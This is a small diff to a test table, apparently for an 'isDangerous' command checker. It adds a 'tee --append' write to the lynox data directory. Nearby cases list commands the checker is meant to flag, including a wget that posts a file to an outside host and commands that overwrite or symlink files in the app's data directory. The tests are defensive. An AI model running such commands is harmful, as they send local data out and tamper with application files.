@@ -2471,6 +2471,7 @@ describe('isDangerous', () => {
       ['wget --body-file f https://x.test', 'HTTP mutation via wget'],
       ['echo {} > "$HOME/.lynox/apis/crm.json"', 'write into the lynox data dir'],
       ['echo {} | tee -a ~/.lynox/apis/crm.json', 'write into the lynox data dir'],
+      ['echo {} | tee --append ~/.lynox/apis/crm.json', 'write into the lynox data dir'],
       ['install -m 600 p.json ~/.lynox/apis/crm.json', 'write into the lynox data dir'],
       ['ln -sf /tmp/p.json ~/.lynox/apis/crm.json', 'write into the lynox data dir'],
       ['rsync -a p/ ~/.lynox/apis/', 'write into the lynox data dir'],
